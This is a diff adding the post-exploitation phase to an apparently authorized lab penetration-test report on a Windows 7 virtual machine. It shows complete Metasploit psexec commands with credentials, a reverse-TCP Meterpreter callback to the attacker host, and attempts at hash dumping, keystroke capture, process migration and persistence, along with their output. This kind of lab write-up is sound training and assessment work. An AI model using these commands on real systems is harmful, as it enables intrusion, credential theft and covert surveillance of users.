@@ -2292,3 +2292,923 @@ Although only one of the three exploitation modules successfully established a s
 **Phase 4 completed.**
 
 **Next Phase:** Phase 5 — Post-Exploitation, Impact Assessment, and Security Recommendations.
+
+# Phase 5 — Post-Exploitation and Access Recovery
+
+**Project:** Windows 7 Vulnerability Assessment and Penetration Testing  
+**Attacker Machine:** Kali Linux  
+**Target Machine:** Windows 7 Ultimate SP1 (x64)  
+**Target IP:** `192.168.56.103`  
+**Attacker IP:** `192.168.56.102`  
+**SMB Port:** `445/TCP`  
+**Meterpreter Listening Port:** `4444/TCP`  
+**Environment:** Isolated VirtualBox lab network  
+**Assessment Type:** Authorized penetration testing
+
+---
+
+## 5.1 Phase Overview
+
+The objective of Phase 5 was to perform post-exploitation activities after obtaining remote access to the Windows 7 target.
+
+The assessment included:
+
+- Recovering remote access using an alternative Metasploit exploitation module.
+- Establishing a Meterpreter session.
+- Identifying the compromised operating system and architecture.
+- Verifying the current user and privilege level.
+- Inspecting running processes.
+- Testing process migration.
+- Attempting to retrieve local account password hashes.
+- Capturing a screenshot of the target.
+- Testing the Meterpreter keystroke-capture functionality.
+- Enumerating currently and recently logged-on users.
+- Reviewing available SMB shares and network services.
+- Testing persistence functionality and documenting its outcome.
+
+An important development occurred during this phase: the original EternalBlue exploitation attempt did not provide the expected access. Rather than assuming that the target was exploitable through MS17-010, an alternative credential-based approach was used.
+
+The `exploit/windows/smb/psexec` module successfully established a new Meterpreter session.
+
+---
+
+## 5.2 Windows 7 Updates and Their Impact on Testing
+
+Before continuing exploitation, two Microsoft update packages were installed on the Windows 7 virtual machine.
+
+The update files included:
+
+- `windows6.1-kb4474419-v3-x64`
+- `windows6.1-kb4490628-x64`
+
+These updates were subsequently visible in the Windows update inventory.
+
+The installed updates were confirmed using the following Windows command:
+
+```cmd
+wmic qfe get HotFixID
+```
+
+The output included:
+
+```text
+HotFixID
+
+KB2534111
+KB4019990
+KB4474419
+KB4490628
+KB976902
+```
+
+Additional operating system information was collected:
+
+```cmd
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+```
+
+Observed output:
+
+```text
+OS Name:       Microsoft Windows 7 Ultimate
+OS Version:    6.1.7601 Service Pack 1 Build 7601
+System Type:   x64-based PC
+```
+
+The target remained Windows 7 Ultimate Service Pack 1, 64-bit.
+
+**Important assessment observation:**
+
+The installation of these two updates changed the software state of the Windows 7 machine. However, neither KB4474419 nor KB4490628 should be treated as proof that MS17-010 was installed or remediated.
+
+The exact reason for the unsuccessful EternalBlue attempt was not established during this assessment.
+
+The following should therefore be recorded separately:
+
+1. Windows 7 was updated with two Microsoft update packages.
+2. The original EternalBlue exploitation attempt was unsuccessful.
+3. The exact MS17-010 patch status was not conclusively established by the evidence collected.
+4. The absence of a configured password was not the cause of an EternalBlue failure.
+
+---
+
+## 5.3 Recovery of Remote Access Using PsExec
+
+### 5.3.1 Reason for Using an Alternative Module
+
+After the initial exploitation attempt did not produce the expected access through EternalBlue, an alternative approach was selected.
+
+The Metasploit module:
+
+```text
+exploit/windows/smb/psexec
+```
+
+was used to establish access through SMB authentication.
+
+Unlike EternalBlue, this approach relies on valid SMB credentials and the ability to execute commands remotely on the target.
+
+The previously configured Windows account credentials were used for the authorized lab assessment.
+
+### 5.3.2 Selecting the Module
+
+Metasploit was started:
+
+```bash
+msfconsole
+```
+
+The PsExec module was selected:
+
+```text
+use exploit/windows/smb/psexec
+```
+
+The module configuration was reviewed:
+
+```text
+show options
+```
+
+### 5.3.3 Configuring the Target
+
+The target address was configured:
+
+```text
+set RHOSTS 192.168.56.103
+```
+
+The SMB username was:
+
+```text
+set SMBUser vboxuser
+```
+
+The SMB password was:
+
+```text
+set SMBPass kali
+```
+
+The reverse TCP Meterpreter payload was configured:
+
+```text
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+```
+
+The Kali machine's IP address was configured as the callback address:
+
+```text
+set LHOST 192.168.56.102
+```
+
+The listening port was configured:
+
+```text
+set LPORT 4444
+```
+
+The exit function was:
+
+```text
+set EXITFUNC thread
+```
+
+The module was then executed:
+
+```text
+run
+```
+
+### 5.3.4 Successful Access Recovery
+
+The following output was observed:
+
+```text
+Started reverse TCP handler on 192.168.56.102:4444
+
+192.168.56.103:445 - Connecting to the server...
+192.168.56.103:445 - Authenticating to 192.168.56.103:445
+as user 'vboxuser'...
+
+192.168.56.103:445 - Selecting PowerShell target
+192.168.56.103:445 - Executing the payload...
+
+Service start timed out, OK if running a command
+or non-service executable...
+
+Sending stage (255678 bytes) to 192.168.56.103
+
+Meterpreter session 1 opened
+(192.168.56.102:4444 -> 192.168.56.103:49158)
+```
+
+**Result: SUCCESS**
+
+A new Meterpreter session was successfully established.
+
+The successful connection demonstrated that:
+
+- The Windows 7 target was reachable over SMB.
+- SMB authentication using the configured credentials succeeded.
+- The PsExec module successfully executed the payload.
+- The reverse TCP connection reached the Kali machine.
+- A new Meterpreter session was established.
+
+This was the principal access-recovery achievement of Phase 5.
+
+---
+
+## 5.4 Backgrounding the Meterpreter Session
+
+After obtaining access, the session was placed in the background:
+
+```text
+background
+```
+
+Observed output:
+
+```text
+Backgrounding session 1...
+```
+
+This returned control to the Metasploit console and allowed additional post-exploitation modules to be selected.
+
+The session remained available as Session 1.
+
+---
+
+## 5.5 System Information Enumeration
+
+The operating system information was collected from the Meterpreter session.
+
+Command:
+
+```text
+sysinfo
+```
+
+Observed output:
+
+```text
+Computer       : WINDOWS7
+OS             : Windows 7 (6.1 Build 7601, Service Pack 1)
+Architecture   : x64
+System Language: en_US
+Domain         : WORKGROUP
+Logged On Users: 2
+Meterpreter    : x64/windows
+```
+
+### Findings
+
+The output confirmed:
+
+- The compromised machine was Windows 7.
+- The operating system was Service Pack 1.
+- The architecture was 64-bit.
+- The target belonged to the WORKGROUP environment.
+- The Meterpreter session used a 64-bit Windows payload.
+
+This confirmed that the recovered session was communicating with the intended target.
+
+---
+
+## 5.6 User and Privilege Enumeration
+
+The current security context was checked using:
+
+```text
+getuid
+```
+
+Observed output:
+
+```text
+Server username: NT AUTHORITY\SYSTEM
+```
+
+The privilege escalation functionality was also checked:
+
+```text
+getsystem
+```
+
+Observed output:
+
+```text
+[-] Already running as SYSTEM
+```
+
+### Findings
+
+The session was already operating under:
+
+```text
+NT AUTHORITY\SYSTEM
+```
+
+This is the highest local Windows service security context.
+
+Consequently, an additional privilege escalation attempt was unnecessary.
+
+**Result: SYSTEM-level privileges were confirmed.**
+
+---
+
+## 5.7 Process Enumeration
+
+The running processes were inspected using:
+
+```text
+ps
+```
+
+The process listing included the following entries:
+
+|  PID | Process           | User                |
+| ---: | ----------------- | ------------------- |
+|    4 | System            | NT AUTHORITY\SYSTEM |
+|  272 | smss.exe          | NT AUTHORITY\SYSTEM |
+|  360 | csrss.exe         | NT AUTHORITY\SYSTEM |
+|  404 | wininit.exe       | NT AUTHORITY\SYSTEM |
+|  424 | csrss.exe         | NT AUTHORITY\SYSTEM |
+|  476 | winlogon.exe      | NT AUTHORITY\SYSTEM |
+|  492 | services.exe      | NT AUTHORITY\SYSTEM |
+|  528 | lsass.exe         | NT AUTHORITY\SYSTEM |
+| 1220 | SearchIndexer.exe | NT AUTHORITY\SYSTEM |
+| 1244 | spoolsv.exe       | NT AUTHORITY\SYSTEM |
+| 1428 | explorer.exe      | WINDOWS7\vboxuser   |
+| 1560 | VBoxTray.exe      | WINDOWS7\vboxuser   |
+
+The process listing was used to identify available processes and their associated security contexts.
+
+The `explorer.exe` process, PID 1428, was subsequently selected for a process migration test.
+
+---
+
+## 5.8 Process Migration
+
+The Meterpreter process migration functionality was tested.
+
+Command:
+
+```text
+migrate 1428
+```
+
+Observed output:
+
+```text
+Migrating from 1244 to 1428...
+
+Migration completed successfully.
+```
+
+The current process ID was subsequently checked:
+
+```text
+getpid
+```
+
+Observed output:
+
+```text
+Current pid: 1428
+```
+
+### Findings
+
+The migration from process ID 1244 to process ID 1428 completed successfully.
+
+The target process was:
+
+```text
+explorer.exe
+```
+
+The process was associated with the logged-in Windows account:
+
+```text
+WINDOWS7\vboxuser
+```
+
+**Important:** The screenshots confirm that migration succeeded, but they do not independently establish the security context after migration. The privilege level should be rechecked after migration when reproducing this test.
+
+---
+
+## 5.9 Password Hash Retrieval Attempt
+
+The Meterpreter hash retrieval functionality was tested using:
+
+```text
+hashdump
+```
+
+Observed output:
+
+```text
+[-] priv_passwd_get_sam_hashes:
+Operation failed: 1168
+```
+
+### Result: FAILED
+
+The attempt to retrieve local SAM password hashes was unsuccessful.
+
+The error code 1168 indicates that the requested element could not be found.
+
+Although the session had previously confirmed SYSTEM-level privileges, hash retrieval still failed.
+
+Possible areas requiring further investigation include:
+
+- Access to the relevant SAM and SYSTEM registry data.
+- Compatibility between the target and the Meterpreter implementation.
+- The state of the target's security subsystems.
+- Whether the required data was accessible to the session.
+
+No password hashes were successfully retrieved in the captured evidence.
+
+This should be documented as a failed post-exploitation activity rather than a successful credential extraction.
+
+---
+
+## 5.10 Target Screenshot Capture
+
+The Meterpreter screenshot functionality was tested.
+
+Command:
+
+```text
+screenshot
+```
+
+Observed output:
+
+```text
+Screenshot saved to:
+/home/kali/0hRJpIMU.jpeg
+```
+
+### Result: SUCCESS
+
+A screenshot of the Windows 7 target was captured and saved on the Kali machine.
+
+The screenshot provided visual evidence of the target's desktop environment.
+
+The resulting file was:
+
+```text
+/home/kali/0hRJpIMU.jpeg
+```
+
+This evidence can be retained in the assessment's screenshot directory.
+
+---
+
+## 5.11 Keystroke-Capture Functionality Test
+
+The Meterpreter keystroke-capture functionality was also tested.
+
+The capture function was started:
+
+```text
+keyscan_start
+```
+
+Observed output:
+
+```text
+Starting the keystroke sniffer ...
+```
+
+The retrieval function was then invoked:
+
+```text
+keyscan_dump
+```
+
+Observed output:
+
+```text
+Dumping captured keystrokes...
+```
+
+### Result: INCONCLUSIVE
+
+The screenshots show that the commands were accepted and the capture operation was initiated.
+
+However, no actual captured keystrokes are visible in the provided evidence.
+
+Therefore, the assessment cannot claim that passwords or other user input were successfully captured.
+
+The test should be recorded as a functionality test with no confirmed captured data.
+
+---
+
+## 5.12 Logged-On User Enumeration
+
+The Meterpreter session was placed in the background and the following Metasploit post-exploitation module was selected:
+
+```text
+use post/windows/gather/enum_logged_on_users
+```
+
+The module configuration was inspected:
+
+```text
+show options
+```
+
+The available options included:
+
+| Option  | Setting | Description                         |
+| ------- | ------- | ----------------------------------- |
+| CURRENT | true    | Enumerate currently logged-on users |
+| RECENT  | true    | Enumerate recently logged-on users  |
+| SESSION | -1      | Session to run the module on        |
+
+The Meterpreter session was specified:
+
+```text
+set SESSION 1
+```
+
+The module was executed:
+
+```text
+run
+```
+
+### 5.12.1 Current Logged-On Users
+
+Observed output:
+
+```text
+Current Logged Users
+
+SID
+S-1-5-21-685279967-3884420820-9665942-1000
+
+User
+WINDOWS7\vboxuser
+```
+
+### 5.12.2 Recently Logged-On Users
+
+The module also returned profile information:
+
+```text
+Recently Logged Users
+
+SID                         Profile Path
+
+S-1-5-18                    C:\Windows\system32\config\systemprofile
+S-1-5-19                    C:\Windows\ServiceProfiles\LocalService
+S-1-5-20                    C:\Windows\ServiceProfiles\NetworkService
+
+S-1-5-21-685279967-3884420820-9665942-1000
+                            C:\Users\vboxuser
+```
+
+### Findings
+
+The enumeration identified:
+
+- The active local account `vboxuser`.
+- The user's SID.
+- The user's profile directory.
+- Standard Windows service profiles.
+- Recently logged-on user information.
+
+The results were automatically saved in the Metasploit loot directory.
+
+Example output paths recorded in the screenshots:
+
+```text
+/home/kali/.msf4/loot/20261124120605_default_192.168.56.103_host.users.recen_406684.txt
+```
+
+```text
+/home/kali/.msf4/loot/20261124122420_default_192.168.56.103_host.users.activ_690125.txt
+```
+
+```text
+/home/kali/.msf4/loot/20261124122421_default_192.168.56.103_host.users.recen_860166.txt
+```
+
+These files provided supporting evidence for the user enumeration results.
+
+---
+
+## 5.13 SMB Share Enumeration
+
+Additional SMB enumeration was conducted to identify accessible network shares.
+
+The following command was used:
+
+```bash
+smbclient -L //192.168.56.103/ -U vboxuser%kali
+```
+
+The SMB client successfully opened an interactive connection.
+
+The SMB enumeration results also identified the following shares:
+
+| Share  | Type | Description                  |
+| ------ | ---- | ---------------------------- |
+| ADMIN$ | DISK | Remote administrative share  |
+| C$     | DISK | Default administrative share |
+| IPC$   | IPC  | Remote IPC                   |
+
+The SMB shares indicated that Windows administrative and IPC resources were exposed through the SMB service.
+
+The SMB user enumeration module was also executed:
+
+```text
+use auxiliary/scanner/smb/smb_enumusers
+```
+
+The password option was configured:
+
+```text
+set SMBPass kali
+```
+
+The module was executed:
+
+```text
+run
+```
+
+Observed result:
+
+```text
+192.168.56.103:445 - Using automatically identified domain: WINDOWS7
+
+WINDOWS7 [ Administrator, Guest, vboxuser ]
+```
+
+### Findings
+
+The enumeration identified three local/domain account names:
+
+- Administrator
+- Guest
+- vboxuser
+
+This provided additional information about the target's account structure.
+
+---
+
+## 5.14 SMB Protocol and RPC Enumeration
+
+SMB protocol discovery was performed using:
+
+```bash
+nmap --script smb-protocols -p445 192.168.56.103
+```
+
+Observed protocols:
+
+```text
+NT LM 0.12 (SMBv1) [dangerous, but default]
+2.0.2
+2.1
+```
+
+This confirmed that SMBv1 was supported by the target.
+
+The SMB operating system discovery command was also executed:
+
+```bash
+nmap --script smb-os-discovery -p445 192.168.56.103
+```
+
+Observed information:
+
+```text
+OS: Windows 7 Ultimate 7601 Service Pack 1
+Computer name: Windows7
+Workgroup: WORKGROUP
+```
+
+Additional RPC endpoint enumeration was performed using the Metasploit module:
+
+```text
+use auxiliary/scanner/dcerpc/endpoint_mapper
+```
+
+The module identified multiple RPC interfaces and endpoints on TCP port 135.
+
+This provided further evidence of exposed Windows RPC services.
+
+---
+
+## 5.15 Persistence Functionality Test
+
+A persistence functionality test was attempted during this phase.
+
+The command entered into the Metasploit console was:
+
+```text
+run persistence -X -i 5 -p 4444 -r 192.168.56.102
+```
+
+The command was issued while the logged-on-user enumeration post module was selected.
+
+The observed output included:
+
+```text
+[-] Git is not available
+[*] Nothing to reload
+[*] Running module against WINDOWS7 (192.168.56.103)
+```
+
+The output subsequently displayed logged-on user enumeration results.
+
+### Result: NOT CONFIRMED
+
+The screenshots do not show a successful persistence installation or a subsequent reconnection proving that persistence worked.
+
+Therefore, persistence must be documented as an attempted but unverified activity.
+
+The following limitations were identified:
+
+- Git was reported as unavailable.
+- The output did not provide confirmation that a persistence mechanism was installed.
+- No reboot or reconnection verification was captured.
+- No cleanup or removal verification was captured.
+
+**Assessment note:** No claim of successful persistence should be made based on this evidence.
+
+For the final lab report, persistence should remain classified as an unsuccessful or inconclusive test.
+
+---
+
+## 5.16 Important Observations and Issues Encountered
+
+Several issues were encountered during Phase 5.
+
+### Issue 1 — Initial EternalBlue Access Was Unsuccessful
+
+The initial exploitation approach did not provide the expected Meterpreter session.
+
+The Windows 7 machine had also undergone two update installations before the subsequent testing.
+
+However, the exact reason for the EternalBlue failure was not established.
+
+The missing Windows account password was not the direct cause because EternalBlue does not depend on SMB password authentication in the same way as PsExec.
+
+### Issue 2 — Alternative Access Was Required
+
+Instead of continuing to rely on the unsuccessful exploitation attempt, the credential-based PsExec module was used.
+
+The following module successfully established a new session:
+
+```text
+use exploit/windows/smb/psexec
+```
+
+The configured credentials were:
+
+```text
+SMBUser: vboxuser
+SMBPass: kali
+```
+
+The target was:
+
+```text
+RHOSTS: 192.168.56.103
+```
+
+The attacker callback configuration was:
+
+```text
+LHOST: 192.168.56.102
+LPORT: 4444
+```
+
+The alternative approach successfully recovered remote access.
+
+### Issue 3 — Hash Retrieval Failed
+
+Although SYSTEM privileges were confirmed, the `hashdump` command returned error 1168.
+
+No hashes were recovered.
+
+### Issue 4 — Persistence Was Not Verified
+
+The persistence command did not produce evidence of successful installation.
+
+It was therefore recorded as an inconclusive test.
+
+### Issue 5 — Keystroke Capture Was Not Confirmed
+
+The keyscan commands were executed, but the available screenshots did not show any captured keystrokes.
+
+---
+
+## 5.17 Phase 5 Results Summary
+
+| Activity                          | Result       | Evidence                       |
+| --------------------------------- | ------------ | ------------------------------ |
+| Alternative PsExec exploitation   | Successful   | Meterpreter session 1 opened   |
+| Meterpreter session establishment | Successful   | Reverse TCP connection         |
+| System information enumeration    | Successful   | `sysinfo`                      |
+| User identification               | Successful   | `getuid`                       |
+| SYSTEM privilege verification     | Successful   | `NT AUTHORITY\SYSTEM`          |
+| Process enumeration               | Successful   | `ps`                           |
+| Process migration                 | Successful   | Migration to PID 1428          |
+| SAM hash retrieval                | Failed       | Error 1168                     |
+| Screenshot capture                | Successful   | JPEG saved on Kali             |
+| Keyscan functionality test        | Inconclusive | No captured keystrokes shown   |
+| Logged-on user enumeration        | Successful   | User and profile information   |
+| SMB share enumeration             | Successful   | ADMIN$, C$, IPC$               |
+| SMB user enumeration              | Successful   | Administrator, Guest, vboxuser |
+| SMB protocol enumeration          | Successful   | SMBv1, SMB 2.0.2, SMB 2.1      |
+| RPC endpoint enumeration          | Successful   | RPC interfaces identified      |
+| Persistence test                  | Not verified | No installation confirmation   |
+
+---
+
+## 5.18 Evidence and Screenshot Organization
+
+The following screenshots should be retained in the `05-post-exploitation` directory.
+
+| Screenshot                       | Evidence Description                             |
+| -------------------------------- | ------------------------------------------------ |
+| `finally-gain-meter-14.png`      | Successful PsExec access and Meterpreter session |
+| `finally-gain-meter-15.png`      | PsExec module configuration and connection       |
+| `finally-gain-meter-16.png`      | Initial session and backgrounding                |
+| `migrate-03.png`                 | Successful process migration                     |
+| `hashdump-04.png`                | Failed SAM hash retrieval                        |
+| `record-result-17.png`           | Screenshot capture and keyscan activity          |
+| `key_scan-06.png`                | Keystroke-capture functionality test             |
+| `persistence-18.png`             | Persistence command and observed output          |
+| `enu-logged-users-16.png`        | Logged-on user enumeration                       |
+| `post-exploi-01.png`             | System information and privilege verification    |
+| `post-exploi-02.png`             | Process enumeration                              |
+| `pivot-network-discovery-17.txt` | Network discovery evidence                       |
+| `smb-client-gain-access-12.png`  | SMB client connection                            |
+| `smb-protocol-07.png`            | SMB protocol enumeration                         |
+| `win7-screenshot-05.jpeg`        | Windows 7 screenshot evidence                    |
+
+---
+
+## 5.19 Security Impact
+
+The post-exploitation activities demonstrated that successful credential-based remote access to the Windows 7 system could provide significant control over the target.
+
+The most important security observations were:
+
+1. Valid SMB credentials permitted remote execution through the PsExec module.
+2. The resulting session operated with SYSTEM-level privileges.
+3. Process information and logged-on user information could be enumerated.
+4. Administrative SMB shares were exposed.
+5. SMBv1 remained supported.
+6. The target's desktop could be captured through the established session.
+7. Additional credential-access and persistence tests did not produce confirmed successful results.
+
+These findings demonstrate the potential impact of weak credential management and exposed administrative services.
+
+---
+
+## 5.20 Cleanup and Lab Restoration
+
+After completing the assessment, the lab should be returned to a known state.
+
+The cleanup procedure should include:
+
+- Review the active Metasploit sessions.
+- Close the Meterpreter session when testing is complete.
+- Verify that no unauthorized test artifacts remain on the Windows 7 machine.
+- Remove any test persistence artifacts if they were installed.
+- Remove temporary payload files.
+- Review the Kali loot directory and protect collected evidence.
+- Restore the Windows 7 snapshot if another assessment cycle is required.
+- Confirm that both virtual machines remain isolated from external networks.
+
+No successful persistence installation was confirmed in this assessment, so cleanup should not assume that a persistence mechanism exists or that the target is clean without verification.
+
+---
+
+## 5.21 Phase 5 Conclusion
+
+Phase 5 successfully demonstrated post-exploitation capabilities against the authorized Windows 7 lab environment.
+
+The initial EternalBlue approach did not produce the expected access. Following this issue, the assessment used the Metasploit `exploit/windows/smb/psexec` module with the configured SMB account credentials.
+
+This alternative approach successfully established Meterpreter Session 1 through the reverse TCP connection.
+
+The session provided access to system information, user enumeration, process enumeration, screenshot capture, and other post-exploitation functionality.
+
+SYSTEM-level privileges were confirmed through the `getuid` output. Process migration to PID 1428 also completed successfully.
+
+However, not every activity succeeded. SAM hash retrieval failed with error 1168, keyscan activity did not provide evidence of captured keystrokes, and the persistence attempt was not verified.
+
+Overall, the phase demonstrated that credential-based remote access was an effective alternative in this particular lab configuration, even though the original vulnerability-based exploitation attempt did not succeed.
+
+**Final Phase 5 Assessment: Successfully completed with documented limitations and inconclusive tests.**
